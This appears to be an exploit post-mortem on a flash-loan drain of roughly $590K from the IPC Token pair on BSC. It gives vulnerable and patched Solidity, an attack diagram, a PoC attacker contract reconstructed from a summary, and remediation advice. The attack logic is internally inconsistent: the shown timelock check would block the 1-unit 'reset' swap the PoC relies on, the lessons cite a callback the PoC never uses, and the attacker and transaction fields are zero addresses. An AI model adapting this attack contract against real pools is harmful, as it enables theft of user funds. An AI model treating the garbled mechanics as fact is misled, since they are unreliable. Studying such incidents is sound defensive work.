# IPC Token — Nested Flash Loan + Timelock Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | IPC Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$590,000 USDT |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://bscscan.com/tx/0x0000000000000000000000000000000000000000000000000000000000000000) |
| **Vulnerable Contract** | IPC Token trading pair (BSC) |
| **Root Cause** | Timelock could be reset with a 1-unit trade, allowing price manipulation via consecutive swaps |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/IPC_exp.sol) |

---

## 1. Vulnerability Overview

The IPC token implemented a time-lock mechanism to prevent consecutive trades. However, the attacker bypassed this by executing nested flash loans from two DODO protocol pools (`dvm1`, `dvm2`) and inserting a 1-unit (1 wei) micro-trade in between to reset the timelock. By repeating the USDT↔IPC swap 16 times, the attacker manipulated the price and drained 590K USDT.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: timelock can be reset with a micro-trade
mapping(address => uint256) public lastTradeTime;

function swap(uint256 amount) external {
    // Timelock check
    require(block.timestamp >= lastTradeTime[msg.sender] + TIMELOCK, "Too soon");
    lastTradeTime[msg.sender] = block.timestamp;
    _executeSwap(amount);
}

// Issue: calling with amount=1 resets the timelock
// A large swap is then possible on the next call (consecutive calls, but timelock is already reset)

// ✅ Safe code: enforce minimum trade amount + cumulative volume limit
function swap(uint256 amount) external {
    require(amount >= MIN_AMOUNT, "Below minimum");
    require(block.timestamp >= lastTradeTime[msg.sender] + TIMELOCK, "Too soon");
    require(dailyVolume[msg.sender] + amount <= MAX_DAILY, "Daily limit exceeded");
    lastTradeTime[msg.sender] = block.timestamp;
    dailyVolume[msg.sender] += amount;
    _executeSwap(amount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO dvm1 flash loan (large amount of USDT)
  │         │
  │         └─→ [2] DODO dvm2 nested flash loan (additional USDT)
  │                   │
  │                   ├─→ [3] USDT → IPC large swap (price increases)
  │                   │
  │                   ├─→ [4] Micro-trade (1 unit) → timelock reset
  │                   │
  │                   ├─→ [5] IPC → USDT reverse swap (profit realization)
  │                   │
  │                   └─→ [6] Steps 3~5 repeated 16 times
  │
  ├─→ [7] Repay dvm2 flash loan
  │
  ├─→ [8] Repay dvm1 flash loan
  │
  └─→ [9] ~590,000 USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract IPCAttacker {
    address constant DVM1 = /* DODO dvm1 address */;
    address constant DVM2 = /* DODO dvm2 address */;

    function attack() external {
        // [1] Request large flash loan from DODO dvm1
        IDODO(DVM1).flashLoan(
            flashAmount1, 0, address(this), abi.encode("outer")
        );
    }

    // DODO flash loan callback (outer flash loan)
    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256(abi.encode("outer"))) {
            // [2] Nested: additional flash loan from dvm2
            IDODO(DVM2).flashLoan(
                flashAmount2, 0, address(this), abi.encode("inner")
            );
            // [7] Repay outer flash loan
            IERC20(USDT).transfer(DVM1, flashAmount1 + fee1);
        } else {
            // [3~6] 16 repeated swaps + timelock bypass
            for (uint256 i = 0; i < 16; i++) {
                // Large swap
                _swap(USDT, IPC, largeAmount);
                // 1-unit micro-swap to reset timelock
                _swap(IPC, USDT, 1);
                // Reverse swap to realize profit
                _swap(IPC, USDT, ipcBalance);
            }
            // [8] Repay inner flash loan
            IERC20(USDT).transfer(DVM2, flashAmount2 + fee2);
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing minimum trade amount validation on timelock (timelock resettable via 1 wei trade) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (nested flash loans + micro-trade trick) |
| **DApp Category** | Token / AMM |
| **Impact** | 590K USDT drained |

## 6. Remediation Recommendations

1. **Enforce minimum trade amount**: Require a minimum amount threshold for any trade that updates the timelock
2. **Cumulative volume-based limits**: Track cumulative trading volume within a time window to block excessive trading
3. **Use TWAP pricing**: Use TWAP instead of spot price to minimize the impact of single-block price manipulation
4. **Flash loan detection**: Add logic to detect borrow-repay patterns within the same transaction

## 7. Lessons Learned

- Timelocks are vulnerable to reset attacks via micro-trades; without a minimum volume floor, they do not provide effective defense.
- The nested structure of DODO flash loans (`DVMFlashLoanCall` + `DPPFlashLoanCall`) enables complex multi-step attacks within a single transaction.
- The repeated swap pattern (16 iterations) is detectable in real time by on-chain monitoring tools, making the construction of anomalous transaction surveillance systems critical.